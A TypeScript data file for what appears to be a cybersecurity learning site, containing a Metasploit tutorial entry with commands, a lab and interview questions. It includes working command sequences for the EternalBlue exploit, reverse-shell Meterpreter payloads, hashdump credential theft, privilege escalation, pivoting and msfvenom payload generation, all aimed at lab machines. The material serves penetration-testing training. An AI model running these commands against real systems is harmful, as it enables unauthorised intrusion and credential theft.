import type { LearningTopic } from "../types";

export const toolMetasploit: LearningTopic = {
  slug: "metasploit",
  kind: "tool",
  title: "Metasploit Framework",
  tagline: "The world's most popular exploitation framework.",
  difficulty: "Advanced",
  estimatedMinutes: 60,
  overview: `The Metasploit Framework (MSF) is a modular exploitation platform maintained by Rapid7 and a huge open-source community. It ships with thousands of exploits, payloads, encoders, auxiliary modules, and post-exploitation tools — plus Meterpreter, an advanced in-memory payload.`,
  whyItMatters: `MSF turns a well-known CVE into a scripted, repeatable exploit in seconds. Understanding *how* it works — not just typing exploit — is what separates a script-kiddie from a pentester.`,
  realWorldScenario: `You confirmed CVE-2017-0144 (EternalBlue) on an unpatched Windows 7 lab VM. \`use exploit/windows/smb/ms17_010_eternalblue\`, set RHOSTS, run — Meterpreter session in under a minute. Follow with \`hashdump\`, \`getsystem\`, \`migrate\`.`,
  objectives: [
    "Navigate msfconsole confidently",
    "Understand module types: exploit, payload, auxiliary, post, encoder",
    "Configure and run modules with correct options",
    "Use Meterpreter effectively",
    "Chain post modules for real workflows",
  ],
  theory: `## Module categories

- **exploit/** — takes advantage of a vulnerability
- **payload/** — code that runs after exploitation (shell, meterpreter)
- **auxiliary/** — scanners, fuzzers, DoS (no exploitation)
- **post/** — post-exploitation modules
- **encoder/** — obfuscate payloads

## Payload types

- \`windows/x64/meterpreter/reverse_tcp\` — Meterpreter over TCP
- \`linux/x64/shell_reverse_tcp\` — plain shell
- Staged vs stageless (\`_reverse_tcp\` vs \`_stageless\`)

## Meterpreter highlights

\`sysinfo\`, \`getuid\`, \`getsystem\`, \`hashdump\`, \`screenshot\`, \`keyscan_start\`, \`portfwd\`, \`route\`, \`migrate\`, \`load kiwi\`.`,
  workflow: [
    "\`msfconsole -q\` to start",
    "\`search <cve|keyword>\` to find modules",
    "\`use <module>\` and \`info\` to read details",
    "\`options\` to see required settings",
    "\`set RHOSTS\`, \`set LHOST\`, \`set LPORT\`",
    "\`check\` (when supported) before firing",
    "\`run\` / \`exploit\`",
    "In Meterpreter: enumerate, migrate to stable process, pivot",
  ],
  commands: [
    { cmd: "msfconsole -q", desc: "Start without banner" },
    { cmd: "search cve:2017 platform:windows type:exploit", desc: "Filtered search" },
    { cmd: "use exploit/windows/smb/ms17_010_eternalblue", desc: "Select a module" },
    { cmd: "set RHOSTS 10.0.0.5", desc: "Set target" },
    { cmd: "set LHOST tun0", desc: "Set attacker IP (interface name)" },
    { cmd: "set payload windows/x64/meterpreter/reverse_tcp", desc: "Choose payload" },
    { cmd: "run", desc: "Execute" },
    { cmd: "sessions -i 1", desc: "Interact with session 1" },
    { cmd: "background", desc: "Detach from Meterpreter to msfconsole" },
    { cmd: "route add 10.10.0.0/24 1", desc: "Pivot: route subnet through session 1" },
  ],
  toolsUsed: ["msfconsole", "msfvenom", "meterpreter", "armitage"],
  expectedOutput: {
    lang: "bash",
    code: `msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.7:4444
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM`,
  },
  commonMistakes: [
    "Forgetting to set LHOST correctly (RFC1918 leaks)",
    "Choosing a payload with the wrong arch/OS for the target",
    "Running staged payloads on strict egress firewalls (stageless works better)",
    "Not migrating out of vulnerable processes → losing the shell",
    "Blindly running modules on production without lab-testing first",
  ],
  miniLab: {
    objective: "Get a Meterpreter session on an intentionally vulnerable lab VM.",
    steps: [
      "Boot Metasploitable 2 in a private network.",
      "In msfconsole: `use exploit/unix/misc/distcc_exec`.",
      "Set RHOSTS + payload cmd/unix/reverse.",
      "Set LHOST/LPORT and run.",
      "Enumerate the shell, capture screenshots.",
    ],
    expected: "A working session with proof of code execution.",
  },
  practiceQuestions: [
    "What's the difference between staged and stageless payloads?",
    "When would you use `run` vs `exploit`?",
    "What does `getsystem` attempt in Meterpreter?",
    "How does `route add` enable pivoting?",
    "Which module type contains scanners without exploitation?",
  ],
  interviewQuestions: [
    "Walk through your process for choosing a payload for a hardened Windows target.",
    "How would you pivot from a compromised DMZ host to an internal subnet?",
    "How do you evade basic AV with msfvenom?",
    "Explain what happens under the hood during a reverse_tcp connect.",
    "When would you NOT use Metasploit?",
  ],
  cheatsheet: [
    { cmd: "search / info / use / options / set / run", desc: "Core module workflow" },
    { cmd: "sessions -l / -i N / -k N", desc: "List / interact / kill sessions" },
    { cmd: "background", desc: "Detach current session" },
    { cmd: "getuid / getsystem / hashdump", desc: "Meterpreter priv-esc / creds" },
    { cmd: "migrate <pid>", desc: "Move to a more stable process" },
    { cmd: "portfwd add -l 8080 -p 80 -r <ip>", desc: "Local port forward via session" },
    { cmd: "msfvenom -p <payload> LHOST=... LPORT=... -f <fmt> -o file", desc: "Standalone payload generation" },
  ],
  references: [
    { label: "Metasploit Unleashed (free)", url: "https://www.offsec.com/metasploit-unleashed/" },
    { label: "MSF GitHub", url: "https://github.com/rapid7/metasploit-framework" },
  ],
  summary: `Metasploit is a force multiplier. Learn what it does under the hood so you're never dependent on a module that suddenly doesn't work.`,
};
